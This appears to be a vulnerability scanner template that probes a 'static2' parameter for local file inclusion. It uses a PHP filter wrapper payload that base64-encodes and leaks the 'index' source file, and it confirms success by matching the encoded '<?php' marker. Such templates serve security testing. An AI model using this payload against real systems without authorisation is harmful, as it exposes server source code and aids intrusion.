id: lfi6-1043
name: 'Traversal in static2'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via static2'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      static2:
        - 'php://filter/convert.base64-encode/resource=index'
    matchers:
      - type: word
        part: body
        words:
          - 'PD9waHA'
